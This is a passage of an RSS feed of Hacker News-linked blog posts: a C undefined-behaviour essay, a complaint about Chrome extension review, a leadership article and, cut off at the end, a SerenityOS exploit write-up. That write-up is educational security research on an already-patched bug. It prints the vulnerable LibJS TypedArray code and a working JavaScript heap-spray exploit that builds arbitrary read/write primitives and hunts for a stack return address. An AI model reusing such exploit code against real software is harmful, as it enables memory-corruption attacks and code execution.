undefined behavior is defined as the following:</p>

<blockquote>
  <p>3.4.3 undefined behavior</p>

  <p>behavior, upon use of a nonportable or erroneous program construct or of erroneous data,
for which this International Standard imposes no requirements</p>

  <p>(…)</p>

  <p>EXAMPLE An example of undefined behavior is the behavior on integer overflow.</p>
</blockquote>

<p>If the C programming language “imposes no requirements” on the behavior of integer
overflow, someone must. That someone is you, the programmer. You are allowed to shoot
your own foot, but if you’re smart you won’t.</p>

<p>Now any pragmatic programmer would think that this discussion doesn’t really make sense,
since the only goal of the recursive factorial function is to teach recursion and only
scratch the surface of C programming, so this discussion is meaningless. If that were the
whole story I would agree with that too and never waste my time writing this, but the
truth is that even though we must keep it simple, we have gone too far:</p>

<blockquote>
  <p><a href="https://quoteinvestigator.com/2011/05/13/einstein-simple/" target="_blank"><img src="https://upload.wikimedia.org/wikipedia/commons/0/06/Albert_Einstein_-_pixabay.svg" alt="Einstein">“Everything should be made as simple as possible, but not simpler” – Some really smart guy</a></p>
</blockquote>

<p>In the C factorial example we have gone beyond as simple as possible and the code has
become oversimplified and thus incorrect. What I’m talking about is the amount of program
failures caused by buffer overflows, rounding errors, uninitialized memory access,
insufficient input validations and others that are main causes of electronic device
misbehaviors and exploitations in modern information technology. Famous bugs include the
$370 million Ariane 5 rocket explosion <a href="#ref-ariane5">[13]</a> and the Year 2000
bug <a href="#ref-y2k">[14]</a>, both caused by numeric overflows. Less impactful were the
integer overflows caused by the addictive Gangnam Style music video being viewed more than
2^31 times on YouTube <a href="#ref-gangnam">[15]</a> and Paypal depositing $92 quadrillion
(2^63 dollars) into the account of a user <a href="#ref-quadrillion">[16]</a>. On the other
hand, the cyberwarfare Stuxnet virus, believed to have been created by the Israeli and
American governments to damage Iranian uranium enrichment
centrifuges <a href="#ref-stuxnet">[17]</a>, was able to successfully spread by using a kind
of improper input validation when displaying Windows shortcut files and receiving Windows
Print Spooler commands, that allowed executing code where there should be only
non-verified data (thus, the vulnerability is called remote code execution).</p>

<p>Yearly lists of most dangerous software errors, besides misconfiguration and weak security
practices, always include out-of-bounds accesses, NULL pointer dereference, improper input
validation and use after freeing dynamic
memory <a href="#ref-vuln1">[18]</a><a href="#ref-vuln2">[19]</a><a href="#ref-vuln3">[20]</a>. These errors are
allowed by the C language, so it’s the programmer’s task to avoid them. If these fall in
the top list of most dangerous software errors, first of all it means they are difficult
to avoid even for skilled programmers and second, programmers are not trained well enough
to avoid them. So, every …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html">https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html</a></em></p>]]>
            </description>
            <link>https://not.cafe/2021/02/08/writing-a-factorial-function-in-c.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116202</guid>
            <pubDate>Fri, 12 Feb 2021 17:36:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It's time to port your extension to Firefox]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 34 (<a href="https://news.ycombinator.com/item?id=26116105">thread link</a>) | @DanielDe
<br/>
February 12, 2021 | https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox | <a href="https://web.archive.org/web/*/https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        
        <h4>February 12th, 2021 · 5 minute read</h4>

        <p>
          I've seen quite a <a href="https://news.ycombinator.com/item?id=21990566">few</a> <a href="https://blog.pushbullet.com/2020/05/13/lets-guess-what-google-requires-in-14-days-or-they-kill-our-extension/">people</a> <a href="https://blog.lipsurf.com/part-ii-after-3-years-of-work-chrome-killed-my-extension-and-wont-tell-me-why/">complaining</a> lately about the Kafkaesque Chrome extension review process, so when I started running into my own problems with the Chrome Web Store I wasn't exactly surprised.
        </p>

        <p>
          It wasn’t until I submitted the same extension to the Firefox Add-Ons Store that I saw just how good things could be. In a world of walled gardens watched over by heavy handed reviewers, Firefox's review process was laughably good.
        </p>

        <section>
          

          <p>
            In January 2020 my buddy and I started working on an idea we had for an automation app. We called it Otto.
          </p>

          <p>
            Otto consisted of two parts: a Mac app and a browser extension. After a few months worth of nights and weekends we had an alpha version we were ready to share with friends. I submitted the browser extension to Chrome under my own personal account, and after a review process of a couple days it was accepted. So far so good.
          </p>
        </section>

        <section>
          

          <p>
            The trouble started a few months later. After some more development and discussion, we re-framed our idea as an app to make custom keyboard shortcuts and we decided to rename Otto to <a href="https://keysmith.app/">Keysmith</a>. We also took the time at this point to create a company Google account. We renamed the extension and submitted it from our new company account.
          </p>

          <p>
            To be clear: changing the name was the <i>only</i> change we made.
          </p>

          <p>
            A few days later we received a rejection email. Here's a timeline of our interaction:
          </p>

          <div>
            
            <p>
                We submit Keysmith to the Chrome Web Store.
              </p>
          </div>

          <div>
            
            <div>
              <p>
                First rejection email.

                Quick summary:
              </p>

              <ul>
                <li>Keysmith "violates the 'Use of Permissions' section"</li>
                <li>We should "Request access to the narrowest permissions necessary"</li>
                <li>"If more than one permission could be used to implement a feature, you must request those with the least access to data or functionality."</li>
                <li>We shouldn't attempt to "future proof"</li>
              </ul>
            </div>
          </div>

          <div>
            
            <div>
              <div><p>
                We double check the permissions we've requested and can't find any problems. We respond asking for more detail.
                </p><p>
                We also mention that we had previously submitted the <i>same</i> extension with the <i>same</i> requested permissions, just under a different name (Otto). We hoped they'd say "oh, in that case we'll approve this right away!". But instead:
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                Otto, our <i>existing extension</i>, is removed from the store and no additional detail on the rejection is provided. In fact, this email contains the <i>same exact</i> text as the previous one.
              </p>
          </div>

          <div>
            
            <p>
                We respond, again asking for more detail. We ask if it would help if we expanded on how we're using each permission in the permissions justification section.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the <i>exact same text again</i>. No further detail. No help at all.
              </p>
          </div>

          <div>
            
            <p>
                We suspect these reviews are entirely automated, so we ask if we can speak to a "human reviewer", hoping this will trigger a manual review (we also consider dropping an f-bomb for the same reason, but decide to remain decent for now).
              </p>
          </div>

          <div>
            
            <p>
                They respond with some <i>slightly</i> different text, but still nothing useful.
              </p>
          </div>

          <div>
            
            <p>
                We try adding a lot more detail to the "justification" section for each of the permissions we use and we resubmit.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the exact same text as the first rejection.
              </p>
          </div>

          <div>
            
            <p>
                We respond with one more plea for more more information.
              </p>
          </div>

          <div>
            
            <p>
                They respond with the same text again.
              </p>
          </div>
        </section>

        <section>
          

          <p>
            At this point I dig into Chrome's documentation once again with a fine-tooth comb and I make a discovery: we had been requesting both the <span>tabs</span> and <span>activeTab</span> permissions, but since we also requested permission to run on <span>&lt;all_urls&gt;</span> it turns out that the features made available by <span>activeTab</span> were a strict subset of the features made available by <span>tabs</span>. So the <span>activeTab</span> permission was redundant. We weren't opening up any new functionality, we were just asking for a <i>redundant</i> permission.
          </p>

          <p>
            This discovery made the Chrome review team's communications far more frustrating in retrospect. The line that all of their emails repeated was "Request access to the narrowest permissions necessary". And, sure, we had asked for <span>activeTab</span> when we didn't need it, but that permission <i>didn't grant us any more functionality</i>. They had rejected our extension 6 times with no detail <i>because of a technicality</i>.
          </p>

          <p>
            We committed the 1 line diff removing the <span>activeTab</span> permission and resubmitted. A day later it was accepted.
          </p>
        </section>

        <section>
          

          <p>
            A Firefox version of our browser extension had long been on our list, but for the first little while it didn't feel worth the additional support cost. We didn't know exactly how large that cost would be, but we suspected that there would be enough differences between the two browsers that it'd be a bit of a hassle to maintain them both.
          </p>

          <p>
            Boy were we wrong. When we finally started looking into porting our extension to Firefox we found that we had to make <i>zero</i> changes to the code. None whatsoever. Firefox even supported the use of the global <span>chrome</span> object for accessing extension APIs (if you're curious, Chrome is not kind enough to return the favor).
          </p>

          <p>
            So we created a Firefox developer account, submitted our extension, and girded ourselves for another rough ride.
          </p>

          <p>
            <i>Boy were we wrong.</i>
          </p>

          <div>
            
            <p>
                We submit the first version of our extension to Firefox.
              </p>
          </div>

          <div>
            
            <div>
              <div><p>
                Less than 3 hours later we receive an email from Firefox that says, in effect, "Sorry this is taking so long, but we'll get to it soon!"
                </p><p>
                Responses from the Chrome team usually came in the wee hours of the morning, making the effective turnaround about 24 hours. Firefox apologizing after fewer than 3 hours was <i>hilarious</i> to us.
              </p></div>
            </div>
          </div>

          <div>
            
            <p>
                We get an email saying the extension was accepted exactly 24 hours after submission.
              </p>
          </div>

          <p>
            Further updates have been even speedier, usually only taking 2 or 3 minutes to be scanned and accepted. One of our updates even got accepted before I finished uploading the unminified source archive (which they require if you minify in production). And the dashboard shows your position in the review queue to give you some idea of when it'll complete.
          </p>

          <p>
            Needless to say, this was a breath of fresh air, and we won't be neglecting support for Firefox ever again in the future.
          </p>
        </section>

        <section>
          

          <p>
            I realize that in some ways this is an unfair comparison. Chrome's market share is much larger than Firefox's these days, so surely they also have to deal with far more extension submissions.
          </p>

          <p>
            But the lack of transparency in their process was infuriating and counter-productive. Had someone taken the time to manually review our case, or at least <i>read any of the emails</i> we sent, we could've resolved this issue with one response. Instead it took 6 responses and a week of wondering if this review process would kill our product before it even launched.
          </p>

          <p>
            I really hope things improve, but I'm not counting on it.
          </p>

        </section>

        <hr>

        
      </div>
    </div></div>]]>
            </description>
            <link>https://www.danielde.dev/blog/its-time-to-port-your-extensions-to-firefox</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116105</guid>
            <pubDate>Fri, 12 Feb 2021 17:27:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ghost in the MP3 (2014)]]>
            </title>
            <description>
<![CDATA[
Score 106 | Comments 64 (<a href="https://news.ycombinator.com/item?id=26116062">thread link</a>) | @Tomte
<br/>
February 12, 2021 | http://theghostinthemp3.com/theghostinthemp3.html | <a href="https://web.archive.org/web/*/http://theghostinthemp3.com/theghostinthemp3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://theghostinthemp3.com/theghostinthemp3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26116062</guid>
            <pubDate>Fri, 12 Feb 2021 17:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start with WHY - A simple framework for great leadership]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26115424">thread link</a>) | @fmfamaral
<br/>
February 12, 2021 | https://www.fernandoamaral.org/start-with-why/ | <a href="https://web.archive.org/web/*/https://www.fernandoamaral.org/start-with-why/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            
            <section>
                <div>
                    <figure><img src="https://www.fernandoamaral.org/content/images/2021/01/startwithwhy-1.png" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/startwithwhy-1.png 600w, https://www.fernandoamaral.org/content/images/2021/01/startwithwhy-1.png 700w"></figure><p><a href="https://simonsinek.com/">Simon Sinek</a> - the author of <em>'<a href="https://simonsinek.com/product/start-with-why/">Start With Why; How Great Leaders Inspire Everyone to Take Action</a>'</em> - identified a pattern in the thoughts, actions, and communication of great leaders like Steve Jobs, Martin Luther King, or the Wright brothers.</p><p>According to Simon, great leaders share a process that is the exact opposite of what the large majority of average, unremarkable leaders do.</p><p>Holding a position of power or authority can define you as a leader, but those who truly lead are the ones who inspire us. <em>"We follow them, not because we have to, but because we want to."</em></p><p>Perhaps you have your sights on developing incredible leadership skills and galvanizing others. Or maybe you want to feel more inspired at work. Either way, learning to start with WHY can be extremely valuable.</p><h3 id="the-golden-circle">The Golden Circle</h3><p>Simon created The Golden Circle, a simple framework that consists of 3 concentric layers: WHAT, HOW, and WHY.</p><figure><img src="https://www.fernandoamaral.org/content/images/2021/01/goldencircle.jpg" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/goldencircle.jpg 600w, https://www.fernandoamaral.org/content/images/size/w1000/2021/01/goldencircle.jpg 1000w, https://www.fernandoamaral.org/content/images/2021/01/goldencircle.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@picoftasty?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Mae Mu</a> on <a href="https://unsplash.com/photos/s6S8IgEN6-4?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure><p><strong>WHAT</strong> - Every leader can articulate what they, and their company, do. Since it's so straightforward, that is where they usually start.</p><p><strong>HOW</strong> - Most leaders also explain how they do what they do. Their unique value proposition, differentiators, and values.</p><p><strong>WHY</strong> - Few leaders make an effort to communicate why they do what they do: What's their purpose? Why does the organization exist? And why should anyone care?</p><p>The real breakthrough is the direction in which to move in the Golden Circle. You have probably guessed it by now. &nbsp;<strong>You're supposed to start with the WHY and move outwards, to the HOW, and finally the WHAT.</strong></p><p>As Simon points out, Martin Luther King gave the <em>"I have a dream"</em> speech, not the <em>"I have a plan"</em> speech.</p><h3 id="start-with-why-within-your-team">Start with WHY within your team</h3><p>When you lead a team, your success depends on the team's ability to accomplish its mission. Creating the conditions for them to succeed should be your number one priority.</p><p>Some leaders might argue that telling people what to do is the shorter, more efficient path to success. They may think that teaching the team how to do their tasks is all that's left to do.</p><p>Well, that might be good enough when dealing with workers doing repetitive, pre-defined chores. However, it is certainly not the best way to manage a high-performing team when problem-solving and creativity are ingredients of their daily tasks.</p><p>Starting with WHY, and reminding it constantly, keeps everyone aligned on the purpose of the team. That will energize and empower each individual to be pro-active, make the right decisions, surpass roadblocks, and the team will move faster as a consequence.</p><p>Teams that start with WHY are also more likely to have a strong sense of purpose and experience less churn.</p><p>People who make a habit of applying this framework can inspire others and be inspired themselves. It applies in both directions. When in doubt, don't be afraid to ask WHY.</p><h3 id="start-with-why-in-marketing">Start with WHY in Marketing</h3><p><em>"People don't buy what you do. They buy why you do it."</em> - Simon repeats this so many times, it can get on your nerves.</p><p>He also claims that <em>"the goal is not to do business with people who need what you have, the goal is to do business with people who believe in what you believe."</em></p><p>Many authors reference Apple again and again to illustrate this point. Let's allow it one more time.</p><figure><img src="https://www.fernandoamaral.org/content/images/2021/01/thinkdifferent.jpg" alt="" srcset="https://www.fernandoamaral.org/content/images/size/w600/2021/01/thinkdifferent.jpg 600w, https://www.fernandoamaral.org/content/images/size/w1000/2021/01/thinkdifferent.jpg 1000w, https://www.fernandoamaral.org/content/images/2021/01/thinkdifferent.jpg 1100w" sizes="(min-width: 720px) 720px"></figure><p>Focusing on the WHAT and the HOW, Apple would sell computers like this:</p><blockquote><em>"We make great computers. They're user friendly, beautifully designed, and easy to use. Want to buy one?"</em></blockquote><p>Starting with WHY and then moving to HOW and WHAT, they would end up with something more along these lines:</p><blockquote><em>"With everything we do, we aim to challenge the status quo. We aim to think differently. Our products are user-friendly, beautifully designed, and easy to use. We just happen to make great computers. Want to buy one?"</em></blockquote><p>In this case, a decision is made emotionally first and then justified rationally. That's why Apple <em>fanboys</em> are often accused of buying inferior products at inflated prices, as long as they come from Cupertino. Whether that is true or an exaggeration, any brand would love to have such a dedicated following.</p><p>Simon states that this behavior is grounded in biology and the way our brain makes decisions. The outer circle (WHAT) corresponds to the neocortex, where rational thoughts and language are processed. The inner circles (HOW and WHY) relate to the limbic system, where our emotions take control.</p><p>A gut feeling, that kind of decision that we need to follow but have trouble explaining rationally, comes straight from the inner circles. If your marketing can tap into the emotions of your audience, amazing things can happen.</p><p>Remember: People don't buy what you do. They buy why you do it.</p><h3 id="start-with-the-ted-talk">Start with the TED Talk</h3><p>If you've made it this far, I recommend watching Simon himself presenting his ideas. The TED Talk amassed more than 50 million views and is well worth 18 minutes of your time.</p><figure><a href="https://www.ted.com/talks/simon_sinek_how_great_leaders_inspire_action"><div><p>How great leaders inspire action</p><p>Simon Sinek has a simple but powerful model for inspirational leadership -- starting with a golden circle and the question: “Why?” His examples include Apple, Martin Luther King Jr. and the Wright brothers ...</p><p><img src="https://pa.tedcdn.com/apple-touch-icon.png"><span>TED Talks</span></p></div><p><img src="https://pi.tedcdn.com/r/pe.tedcdn.com/images/ted/04916ee6e81065c8333e6546184af512eee37bbe_2880x1620.jpg?c=1050%2C550&amp;w=1050"></p></a></figure><p>At this point, you'll probably be considering whether to read the book or not.</p><p>Although I strongly identify with the notion of starting with WHY and I've applied it many times in my life since I've discovered it, I have to say that 256 pages around this simple concept are a stretch.</p><p>The book reiterates the same message ad nauseam, and I found myself repeating <em>"Ok... I got it, start with WHY!" in my head, </em>halfway through it.</p><figure><a href="https://simonsinek.com/product/start-with-why/"><div><p>Start With Why | Simon Sinek</p><p>In 2009, Simon Sinek started a movement to help people become more inspired at work, and in turn inspire their colleagues and customers. Since then, millions have been touched by the power of his…</p><p><img src="https://simonsinek.com/wp-content/uploads/2018/08/cropped-SWW_favicon-192x192.png"><span>Simon Sinek</span></p></div><p><img src="https://simonsinek.com/wp-content/uploads/2018/09/SWW-Cover-High-Res.jpg"></p></a></figure><p>My advice is to skip the book, but I'm sure your limbic brain has already made its decision. 🧠</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Fernando Amaral</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.fernandoamaral.org/start-with-why/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115424</guid>
            <pubDate>Fri, 12 Feb 2021 16:35:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SerenityOS: Writing a Full Chain Exploit]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26115141">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>I recently came across <a href="https://github.com/SerenityOS/serenity">SerenityOS</a> when it was featured in hxp CTF and then on <a href="https://twitter.com/liveoverflow">LiveOverflow’s</a> YouTube channel. SerenityOS is an open source operating system written from scratch by <a href="https://twitter.com/awesomekling">Andreas Kling</a> and now has a strong and active community behind it. If you’d like to learn a bit more about it then the recent <a href="https://cppcast.com/serenity-os/">CppCast episode</a> is a good place to start, as well as all of the <a href="https://www.youtube.com/andreaskling">fantastic videos by Andreas Kling</a>.</p>

<p>Two of the recent videos were about writing exploits for a <a href="https://www.youtube.com/watch?v=LMvjaoBLPxA">typed array bug in javascript</a>, and a <a href="https://www.youtube.com/watch?v=gt6-TC6FtMs">kernel bug in munmap</a>. The videos were great to watch and got me thinking that it would be fun to try and find a couple of bugs that could be chained together to create a full chain exploit such as exploiting a browser bug to exploit a kernel bug to get root access.</p>

<h3 id="entrypoint">Entrypoint</h3>

<p>I started looking around and discovered an integer overflow when creating a typed array from an array buffer, the length was multiplied by the element size which could overflow.
<a href="https://github.com/SerenityOS/serenity/blob/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b/Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69">Userland/Libraries/LibJS/Runtime/TypedArray.cpp#L69</a></p>

<div><div><pre><code><span>static</span> <span>void</span> <span>initialize_typed_array_from_array_buffer</span><span>(</span><span>GlobalObject</span><span>&amp;</span> <span>global_object</span><span>,</span> <span>TypedArrayBase</span><span>&amp;</span> <span>typed_array</span><span>,</span> <span>ArrayBuffer</span><span>&amp;</span> <span>array_buffer</span><span>,</span> <span>Value</span> <span>byte_offset</span><span>,</span> <span>Value</span> <span>length</span><span>)</span>
<span>{</span>
    <span>// SNIP ...</span>

    <span>auto</span> <span>buffer_byte_length</span> <span>=</span> <span>array_buffer</span><span>.</span><span>byte_length</span><span>();</span>
    <span>size_t</span> <span>new_byte_length</span><span>;</span>
    <span>if</span> <span>(</span><span>length</span><span>.</span><span>is_undefined</span><span>())</span> <span>{</span>
        <span>if</span> <span>(</span><span>buffer_byte_length</span> <span>%</span> <span>element_size</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayInvalidBufferLength</span><span>,</span> <span>typed_array</span><span>.</span><span>class_name</span><span>(),</span> <span>element_size</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>if</span> <span>(</span><span>offset</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffset</span><span>,</span> <span>offset</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
        <span>new_byte_length</span> <span>=</span> <span>buffer_byte_length</span> <span>-</span> <span>offset</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>new_byte_length</span> <span>=</span> <span>new_length</span> <span>*</span> <span>element_size</span><span>;</span>
        <span>if</span> <span>(</span><span>offset</span> <span>+</span> <span>new_byte_length</span> <span>&gt;</span> <span>buffer_byte_length</span><span>)</span> <span>{</span>
            <span>vm</span><span>.</span><span>throw_exception</span><span>&lt;</span><span>RangeError</span><span>&gt;</span><span>(</span><span>global_object</span><span>,</span> <span>ErrorType</span><span>::</span><span>TypedArrayOutOfRangeByteOffsetOrLength</span><span>,</span> <span>offset</span><span>,</span> <span>offset</span> <span>+</span> <span>new_byte_length</span><span>,</span> <span>buffer_byte_length</span><span>);</span>
            <span>return</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>typed_array</span><span>.</span><span>set_viewed_array_buffer</span><span>(</span><span>&amp;</span><span>array_buffer</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_length</span><span>(</span><span>new_byte_length</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_byte_offset</span><span>(</span><span>offset</span><span>);</span>
    <span>typed_array</span><span>.</span><span>set_array_length</span><span>(</span><span>new_byte_length</span> <span>/</span> <span>element_size</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This could be used to create two powerful primitives, one that could read an arbitrary address and the other that could read an arbitrary amount from some allocated memory. These were the same primitives that Kling created in his video which meant that the issue could be exploited in exactly the same way:</p>

<ul>
  <li>Finding a vtable pointer with the offset primitive by spraying lots of Numbers</li>
  <li>Use the deterministic memory layout to calculating the stack location</li>
  <li>Find the saved return address on the stack</li>
  <li>Overwriting it with a rop chain.</li>
</ul>

<p>While I was looking into exploiting this, someone else spotted the same issue and it was quickly patched.</p>

<p><a href="https://github.com/SerenityOS/serenity/commit/f6c6047e49f1517778f5565681fb64750b14bf60"><img src="https://devcraft.io/assets/serenity/slack.jpg" alt="slack"></a></p>

<p>As I had already started and wanted to keep using the same issue, I kept working from <a href="https://github.com/SerenityOS/serenity/commit/c899ace3ad1efbf1bc8f8ee2ebb1e35903d7224b">this commit</a> which still had the bug :)</p>

<p>Exploiting the issue is pretty much identical to the video above and it does a great job explaining what is going on, so I wont go into too much detail. Here Is what I ended up with:</p>

<div><div><pre><code><span>&lt;script&gt;</span>
  <span>function</span> <span>log</span><span>(</span><span>msg</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>msg</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>starting hax</span><span>"</span><span>);</span>

  <span>const</span> <span>AAAs</span> <span>=</span> <span>2261634.509804</span><span>;</span>
  <span>const</span> <span>spray_size</span> <span>=</span> <span>2000</span><span>;</span>
  <span>const</span> <span>spray</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>spray_size</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>// Create an array with a null backing store allowing arbitary rw</span>
  <span>ab1</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>();</span>
  <span>ua1</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab1</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>// Create an array with a large length but a valid backing store</span>
  <span>ab2</span> <span>=</span> <span>new</span> <span>ArrayBuffer</span><span>(</span><span>0x50000</span><span>);</span>
  <span>ua2</span> <span>=</span> <span>new</span> <span>Uint32Array</span><span>(</span><span>ab2</span><span>,</span> <span>4</span><span>,</span> <span>0x3fffffff</span><span>);</span>

  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>spray_size</span> <span>/</span> <span>2</span><span>;</span> <span>i</span> <span>&lt;</span> <span>spray_size</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>spray</span><span>[</span><span>i</span><span>]</span> <span>=</span> <span>new</span> <span>Number</span><span>(</span><span>AAAs</span><span>);</span>
  <span>}</span>

  <span>log</span><span>(</span><span>"</span><span>done spraying</span><span>"</span><span>);</span>

  <span>function</span> <span>read</span><span>(</span><span>addr</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write</span><span>(</span><span>addr</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua1</span><span>[</span><span>addr</span> <span>/</span> <span>4</span> <span>-</span> <span>1</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>// 0x6c000 is the offset from the array buffer to the next heap allocation</span>
  <span>function</span> <span>read_heap</span><span>(</span><span>off</span><span>)</span> <span>{</span>
    <span>return</span> <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>];</span>
  <span>}</span>

  <span>function</span> <span>write_heap</span><span>(</span><span>off</span><span>,</span> <span>value</span><span>)</span> <span>{</span>
    <span>ua2</span><span>[</span><span>0x6c000</span> <span>/</span> <span>4</span> <span>+</span> <span>off</span><span>]</span> <span>=</span> <span>value</span><span>;</span>
  <span>}</span>

  <span>let</span> <span>number_i</span> <span>=</span> <span>0</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>looking for 0x41414141</span><span>"</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>100</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read_heap</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>0x41414141</span><span>)</span> <span>{</span>
      <span>log</span><span>(</span><span>"</span><span>found 0x</span><span>"</span> <span>+</span> <span>i</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span> <span>+</span> <span>"</span><span>: 0x</span><span>"</span> <span>+</span> <span>read_heap</span><span>(</span><span>i</span><span>).</span><span>toString</span><span>(</span><span>16</span><span>));</span>
      <span>number_i</span> <span>=</span> <span>i</span><span>;</span>
      <span>break</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>const</span> <span>number_i_vtable</span> <span>=</span> <span>number_i</span> <span>-</span> <span>8</span><span>;</span>

  <span>const</span> <span>libjs_data_addr</span> <span>=</span> <span>read_heap</span><span>(</span><span>number_i_vtable</span><span>)</span> <span>-</span> <span>0x28ac</span><span>;</span>
  <span>const</span> <span>libjs_addr</span> <span>=</span> <span>libjs_data_addr</span> <span>-</span> <span>0xe0000</span><span>;</span>
  <span>const</span> <span>stack_addr</span> <span>=</span> <span>libjs_addr</span> <span>-</span> <span>0x2537000</span><span>;</span>

  <span>log</span><span>(</span><span>"</span><span>libjs_data_addr 0x</span><span>"</span> <span>+</span> <span>libjs_data_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>libjs_addr 0x</span><span>"</span> <span>+</span> <span>libjs_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>
  <span>log</span><span>(</span><span>"</span><span>stack_addr 0x</span><span>"</span> <span>+</span> <span>stack_addr</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>));</span>

  <span>log</span><span>(</span><span>"</span><span>looking for stack return</span><span>"</span><span>);</span>
  <span>let</span> <span>stack_ret</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>stack_addr</span> <span>+</span> <span>0x400000</span> <span>-</span> <span>4</span><span>;</span> <span>i</span> <span>&gt;</span> <span>stack_addr</span><span>;</span> <span>i</span> <span>-=</span> <span>4</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>read</span><span>(</span><span>i</span><span>)</span> <span>==</span> <span>libjs_addr</span> <span>+</span> <span>0x5af5e</span><span>)</span> <span>{</span>
